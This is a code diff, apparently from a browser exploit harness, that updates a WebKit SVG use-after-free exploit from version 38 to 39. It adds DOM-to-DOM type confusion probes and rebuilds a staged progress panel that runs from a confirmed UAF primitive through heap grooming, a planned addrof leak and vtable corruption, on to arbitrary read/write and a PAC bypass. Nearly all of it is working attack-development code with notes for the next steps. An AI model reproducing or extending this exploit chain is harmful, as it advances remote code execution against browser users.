+    var pageReused2=typeof newSlot2==='number'&&newSlot2>=ITAG&&newSlot2<ITAG+N2;
+    log('  kernelMatrix N='+N2+' ('+N2*81+' SVGNums) → new matrix slot[0]='+newSlot2+(pageReused2?' ← REUSE!':' (fresh)'),
+      pageReused2?'win':'inf');
+    if(pageReused2&&!R.siz2_page_bytes)R.siz2_page_bytes=N2*81;
+    cleanupD(dNew2);
+  }
+
+  if(!q)dis(false);
 }
 
 // ── SUMMARY PANEL ──
-function buildSummary() {
+function buildSummary(){
   SPanel.classList.add('visible');
-  function badge(label, kind) {
-    return '<span class="badge badge-' + kind + '">' + label + '</span>';
-  }
-  function stageRow(dot, name, verdict, verdictClass, badges, note) {
-    var bHtml = badges && badges.length ? '<div class="result-badges">' + badges.join('') + '</div>' : '';
-    return '<div class="stage-row">' +
-      '<div class="stage-dot ' + dot + '"></div>' +
-      '<div class="stage-name">' + name + '</div>' +
-      '<div class="stage-verdict">' +
-        '<span class="' + verdictClass + '">' + verdict + '</span>' +
-        (note ? '<br><span style="color:#555;font-size:9px">' + note + '</span>' : '') +
-        bHtml +
+  function badge(l,k){return '<span class="badge badge-'+k+'">'+l+'</span>';}
+  function stageRow(dot,name,verdict,vc,badges,note){
+    var bHtml=badges&&badges.length?'<div class="result-badges">'+badges.join('')+'</div>':'';
+    return'<div class="stage-row">'+
+      '<div class="stage-dot '+dot+'"></div>'+
+      '<div class="stage-name">'+name+'</div>'+
+      '<div class="stage-verdict">'+
+        '<span class="'+vc+'">'+verdict+'</span>'+
+        (note?'<br><span style="color:#555;font-size:9px">'+note+'</span>':'')+
+        bHtml+
       '</div></div>';
   }
 
-  var groomWorked = R.grm3_hits > 0 || R.grm3_pressure_helped;
-  var crossBucket = R.grm3_same_bucket;
-  var wasHit = R.was_hit || R.was_ab_hit;
-  var strHit = R.str_len_corrupted;
-  var mco3ok = R.mco3_ok && R.mco3_formula_ok;
-  var szeKnown = R.sze_sizeof !== null;
+  var d1=R.dom1_svglen_hit;
+  var d2=R.dom2_svgpoint_hit;
+  var d3=R.dom3_svgoptnum_hit;
+  var d4=R.dom4_sizeof!==null;
+  var d5=!R.dom5_vtable_corrupt;
+  var d6=R.dom6_animnum_same_bucket;
+  var anyDomHit=d1||d2||d3||d6;
+  var ulpKnown=R.ptr2_ulp_4g!==null;
+  var pageKnown=R.siz2_page_bytes!==null;
 
-  var html = '';
+  var html='';
 
-  html += stageRow('dot-green', 'Stage 0 — UAF Primitive', '✅ DONE — 256+ UAF float32 slots (order=16)', 'verdict-green',
-    [badge('feColorMatrix ×20','ok'),badge('kernelMatrix ×256','ok'),badge('feFuncR/G/B/A ×32','ok'),badge('ALL float32','warn')],
-    'float32 confirmed on ALL SVG types. No float64 path via SVG.');
+  html+=stageRow('dot-green','Stage 0 — UAF Primitive','✅ DONE — 256+ UAF float32 slots confirmed','verdict-green',
+    [badge('feColorMatrix ×20','ok'),badge('kernelMatrix ×256','ok'),badge('feFuncR/G/B/A ×32','ok')],
+    'DOM heap (bmalloc::IsoHeap) confirmed separate from JS heap (JSC::MarkedSpace).');
 
-  html += stageRow(
-    groomWorked ? 'dot-green' : 'dot-yellow',
+  html+=stageRow(
+    anyDomHit?'dot-yellow':'dot-red',
     'Stage 1 — Heap Groom',
-    groomWorked ? '✅ GROOM WORKS' : '⚠️ BLOCKED — bmalloc prefers fresh pages',
-    groomWorked ? 'verdict-green' : 'verdict-yellow',
+    anyDomHit?'⚡ DOM-DOM overlap found!':'🔴 BLOCKED — all DOM types in separate IsoHeap buckets',
+    anyDomHit?'verdict-yellow':'verdict-red',
     [
-      badge('hueRotate spray: ' + (R.grm3_hits > 0 ? 'HIT' : 'miss'), R.grm3_hits > 0 ? 'ok' : 'warn'),
-      badge('pressure: ' + (R.grm3_pressure_helped ? 'HIT' : 'miss'), R.grm3_pressure_helped ? 'ok' : 'warn'),
-      badge('cross-bucket: ' + (crossBucket ? 'YES' : 'no'), crossBucket ? 'win' : 'info'),
+      badge('SVGLength: '+(d1?'HIT':'miss'),d1?'ok':'warn'),
+      badge('SVGPoint: '+(d2?'HIT':'miss'),d2?'ok':'warn'),
+      badge('OptNum: '+(d3?'HIT':'miss'),d3?'ok':'warn'),
+      badge('AnimNum: '+(d6?'HIT':'miss'),d6?'ok':'warn'),
+      badge('sizeof: '+(d4?R.dom4_sizeof:'?'),d4?'ok':'warn'),
+      badge('page: '+(pageKnown?R.siz2_page_bytes+'objs':'?'),pageKnown?'ok':'warn'),
     ],
-    groomWorked ? 'IsoHeap slot reuse confirmed!' :
-      'bmalloc scavenger not triggered by JS pressure. Need OS memory pressure OR different alloc target.'
+    anyDomHit?'DOM type overlap confirmed → type confusion next':'Need to find DOM class with same IsoHeap bucket as SVGNumber.'
   );
 
-  html += stageRow(
-    wasHit ? 'dot-yellow' : (groomWorked ? 'dot-yellow' : 'dot-red'),
+  html+=stageRow(
+    anyDomHit?'dot-yellow':'dot-red',
     'Stage 2 — Type Confusion',
-    wasHit ? '⚡ OVERLAP DETECTED — wasm/JS object hit' :
-    (groomWorked ? '🟡 POSSIBLE — groom works, need timing' : '🔴 BLOCKED — needs Stage 1'),
-    wasHit ? 'verdict-yellow' : (groomWorked ? 'verdict-yellow' : 'verdict-red'),
-    [badge('wasm.Memory: '+(wasHit?'HIT':'miss'), wasHit?'ok':'warn'),
-     badge('JSString: '+(strHit?'HIT':'miss'), strHit?'ok':'warn'),
-     badge('sizeof: '+(szeKnown?R.sze_sizeof+'B':'?'), szeKnown?'ok':'warn')],
-    'JSCell header corrupt → JSType byte → type confusion.'
+    anyDomHit?'🟡 POSSIBLE — need to corrupt vtable via DOM-DOM overlap':'🔴 BLOCKED — needs Stage 1',
+    anyDomHit?'verdict-yellow':'verdict-red',
+    [badge('UAF stable: '+(d5?'YES':'NO'),d5?'ok':'fail'),
+     badge('write all slots: ok','ok'),
+     badge('need: vtable overwrite','warn')],
+    'Write float32 to vtable offset of confused DOM object → redirect virtual call.'
   );
 
-  html += stageRow('dot-red', 'Stage 3 — AddrOf Leak',
-    '🔴 BLOCKED — ALL SVG types are float32. Need type confusion OR new primitive.',
+  html+=stageRow('dot-red','Stage 3 — AddrOf Leak',
+    '🔴 BLOCKED — float32 precision limit at heap range = '+
+    (ulpKnown?R.ptr2_ulp_4g+' bytes loss':'unknown')+' ULP',
     'verdict-red',
-    [badge('float32 confirmed','fail'),badge('wasm buffer probe: '+(wasHit?'hit':'no'),'warn'),badge('oracle inversion: '+(mco3ok?'ok':'?'),mco3ok?'ok':'warn')],
-    'No float64 path. Options: (1) corrupt wasm.Memory buffer ptr via type confusion, (2) use corrupted string for OOB read, (3) find float64 alloc in same IsoHeap bucket.');
+    [badge('float32 max exact int = 2^24','fail'),
+     badge('ULP@4GB: '+(ulpKnown?R.ptr2_ulp_4g+'b':'?'),ulpKnown?(R.ptr2_ulp_4g<16?'ok':'warn'):'warn'),
+     badge('block-aligned ptrs: feasible','info')],
+    'At 4GB range, heap block base pointers (64KB aligned) ARE representable in float32. Block-level leak possible.');
 
-  html += stageRow('dot-red', 'Stage 4 — FakeObj', '🔴 BLOCKED — needs Stage 3', 'verdict-red',
-    [badge('needs addrof first','info')], 'Unblocked once we can read a heap address.');
+  html+=stageRow('dot-red','Stage 4 — FakeObj','🔴 BLOCKED — needs Stage 3','verdict-red',
+    [badge('needs addrof first','info')],'');
+  html+=stageRow('dot-red','Stage 5 — Arb Read/Write','🔴 BLOCKED — needs Stage 4','verdict-red',
+    [badge('ArrayBuffer confusion','info'),badge('JSC butterfly OOB','info')],'');
+  html+=stageRow('dot-grey','Stage 6 — PAC Bypass + Escape','⬜ FAR — separate research','verdict-grey',
+    [badge('arm64e PAC','fail'),badge('sandbox escape','info')],'');
 
-  html += stageRow('dot-red', 'Stage 5 — Arb Read/Write', '🔴 BLOCKED — needs Stage 4', 'verdict-red',
-    [badge('ArrayBuffer confusion','info'),badge('JSC butterfly OOB','info')], '');
-
-  html += stageRow('dot-grey', 'Stage 6 — PAC Bypass + Escape', '⬜ FAR — separate research', 'verdict-grey',
-    [badge('arm64e PAC','fail'),badge('sandbox escape','info')], '');
-
-  html += '<div class="summary-divider"></div>';
-  html += '<div class="summary-footer">' +
-    '<span class="highlight">KEY WINS: </span>' +
-    (R.km256_ok ? '✅ 256-slot kernelMatrix UAF  ' : '') +
-    (mco3ok ? '✅ sRGB oracle formula confirmed  ' : '') +
-    (groomWorked ? '✅ IsoHeap groom works!  ' : '') +
-    (wasHit ? '⚡ wasm.Memory overlap  ' : '') +
-    (strHit ? '⚡ JSString corruption  ' : '') +
-    '<br><span class="highlight">BLOCKERS: </span>' +
-    (!groomWorked ? '⚠️ IsoHeap groom — bmalloc prefers fresh pages  ' : '') +
-    '⚠️ ALL SVG primitives float32 — need float64 for addrof  ' +
-    '<br><span class="highlight">NEXT (v39): </span>' +
-    (groomWorked ? 'type confusion PoC with confirmed groom  ' : 'try OS memory pressure (multiple large ArrayBuffers)  ') +
-    (wasHit ? 'exploit wasm.Memory overlap for ptr leak  ' : '') +
-    (strHit ? 'chain JSString OOB read for pointer leak  ' : '') +
-    (!wasHit && !strHit ? 'force different alloc class into SVGNumber bucket  ' : '') +
+  html+='<div class="summary-divider"></div>';
+  html+='<div class="summary-footer">'+
+    '<span class="highlight">KEY WINS: </span>'+
+    '✅ 256-slot kernelMatrix UAF  '+
+    '✅ sRGB oracle inversion confirmed  '+
+    (anyDomHit?'⚡ DOM-DOM overlap FOUND  ':'')+
+    (d4?'✅ sizeof(SVGNumber)='+R.dom4_sizeof+'  ':'')+
+    '<br><span class="highlight">BLOCKERS: </span>'+
+    (!anyDomHit?'⚠️ no DOM bucket overlap yet  ':'')+
+    '⚠️ float32 ULP too large for per-object ptr precision at 4GB  '+
+    '<br><span class="highlight">NEXT (v40): </span>'+
+    (anyDomHit?'vtable corruption PoC on overlapping DOM type  ':'try more DOM types: SVGMatrix, SVGTransform, CSSPrimitiveValue, SVGLength 16-byte class  ')+
   '</div>';
 
-  SBody.innerHTML = html;
+  SBody.innerHTML=html;
 }
 
-async function runAll() {
-  dis(true); clearAll(); sep();
-  log('SVG UAF v38 — hueRotate spray + wasm addrof + string OOB + sizeof + oracle fix + ptr range', 'inf');
-  sep();
-  var tests = [
-    ['GRM3_hueRotate_spray', runGRM3],
-    ['WAS_wasm_addrof',      runWAS],
-    ['STR_string_oob',       runSTR],
-    ['SZE_sizeof_probe',     runSZE],
-    ['MCO3_oracle_fix',      runMCO3],
-    ['PTR_ptr_range',        runPTR],
+async function runAll(){
+  dis(true);clearAll();sep();
+  log('SVG UAF v39 — DOM-to-DOM type confusion probe','inf');sep();
+  var tests=[
+    ['DOM1_SVGLength_probe',runDOM1],
+    ['DOM2_SVGPoint_probe', runDOM2],
+    ['DOM3_SVGOptNum_probe',runDOM3],
+    ['DOM4_sizeof_probe',   runDOM4],
+    ['DOM5_vtable_detect',  runDOM5],
+    ['DOM6_AnimNum_probe',  runDOM6],
+    ['PTR2_ULP_boundary',   runPTR2],
+    ['SIZ2_page_size',      runSIZ2],
   ];
-  for (var i = 0; i < tests.length; i++) {
-    sep(); log(tests[i][0], 'inf'); sep();
-    try { await tests[i][1](true); }
-    catch(e) { log('[!] ' + tests[i][0] + ' threw: ' + e, 'bad'); }
+  for(var i=0;i<tests.length;i++){
+    sep();log(tests[i][0],'inf');sep();
+    try{await tests[i][1](true);}
+    catch(e){log('[!] '+tests[i][0]+' threw: '+e,'bad');}
     log('');
   }
   sep();
-  log('Building summary panel...', 'dim');
+  log('Building summary panel...','dim');
   buildSummary();
   dis(false);
 }
